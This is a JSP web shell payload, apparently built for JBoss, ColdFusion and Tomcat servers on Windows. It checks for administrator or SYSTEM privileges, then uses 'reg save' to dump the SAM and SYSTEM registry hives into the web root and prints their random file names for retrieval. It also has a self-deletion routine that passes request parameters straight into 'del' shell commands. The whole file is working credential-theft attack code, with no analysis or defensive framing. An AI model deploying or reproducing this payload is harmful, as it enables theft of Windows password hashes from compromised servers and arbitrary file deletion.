<%@ page import="java.net.*, java.io.*, java.util.*, java.lang.*, java.lang.String, java.security.*, sun.misc.BASE64Encoder" %>
<%!public String strEncode(String str){sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();byte[] b1 = str.getBytes();String result = encoder.encode(b1);result = result.replace("==", ""); result = result.replace("=", "");	return result;}%>
<%
if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) // THIS IS SPAR...WINDOWS!!!
{
	Process p;
	String webapproot = System.getProperty("user.dir");
	webapproot = webapproot.replace("bin", "");
	webapproot = webapproot.replace("runtime\\", "");
	p = Runtime.getRuntime().exec("cmd.exe /c cd " +  webapproot + " && dir getSAM.jsp /s | findstr Directory");
	//out.println(webapproot);
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	String getSAMdir = "";
	//out.println(disr);
	getSAMdir = disr.replace("Directory of ", "");
	//out.println(getSAMdir);
	
	if (request.getParameter("del") != null)
	{
		//JBoss -- TODO: Remove other "getSAM" references in the server. (CLASS, and JAVA files)
		if (getSAMdir.contains("getSAM.war"))
		{
			//out.println("Deleting..." + getSAMdir+".war");
			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir);
		}
		//Coldfusion
		else if (getSAMdir.contains("wwwroot"))
		{
			//out.println("Deleting..." + getSAMdir + "\\getSAM.jsp");
			//out.println(request.getParameter("del"));
			//out.println(request.getParameter("del2"));
			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + "\\" + request.getParameter("del"));
			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + "\\" + request.getParameter("del2"));
			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + "\\getSAM.jsp");
		}
		//Tomcat
		else if (getSAMdir.contains("getSAM"))
		{
			//out.println("Deleting..." + getSAMdir);
			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + ".war");
		}
	}

	else if (request.getParameter("del") == null)
	{
		p = Runtime.getRuntime().exec("cmd.exe /C net localgroup | findstr *Administrators");
		os = p.getOutputStream();
		in = p.getInputStream();
		dis = new DataInputStream(in);
		disr = dis.readLine();
	
		boolean isadmin = false;
		
		while ( disr != null ) 
		{
			if ( disr.contains("*Administrators") )
			{
				isadmin = true;
				break;
			}
		}
	
		if(!isadmin)
		{
			p = Runtime.getRuntime().exec("cmd.exe /C echo %USERNAME%");
			os = p.getOutputStream();
			in = p.getInputStream();
			dis = new DataInputStream(in);
			disr = dis.readLine();
			if( disr.toLowerCase() == "system")
			{
				isadmin = true;
			}
		}

		if(!isadmin)//Last ditch effort...
		{
			p = Runtime.getRuntime().exec("cmd.exe /C whoami");
			os = p.getOutputStream();
			in = p.getInputStream();
			dis = new DataInputStream(in);
			disr = dis.readLine();
			if( disr.toLowerCase().contains("system"))
			{
				isadmin = true;
			}
		}
	
		if(isadmin)
		{
			int i = 8;
			String key1 = UUID.randomUUID().toString();
			String key2 = UUID.randomUUID().toString();
			key1 = key1.substring(0,i);
	    	key2 = key2.substring(0,i);	
			p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\SAM " + getSAMdir + "\\" + key1);
			p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\System " + getSAMdir + "\\" + key2);
			Thread.sleep(500);//Give the server a second...
			p = Runtime.getRuntime().exec("cmd.exe /c cd " + getSAMdir + " && dir");
	    	in = p.getInputStream();
	    	dis = new DataInputStream(in);
	    	while ( disr != null ) 
			{
				if ( disr.contains(" 0 " + key1))
	    		{
	    			p = Runtime.getRuntime().exec("cmd.exe /c del /F /Q " + getSAMdir + "\\" + key1);
	    			p = Runtime.getRuntime().exec("cmd.exe /c del /F /Q " + getSAMdir + "\\" + key2);
	    			isadmin = false;
	    			break;
	    		}
	    		disr = dis.readLine();
	    	}
	    	if(isadmin)
	    	{
	    		out.println(key1 + "<>" + key2);
	    	}
	    }
	
	    else//If a blank page returned clustered should run undeploy command
	    {
	    }
	}
}

else{}
%>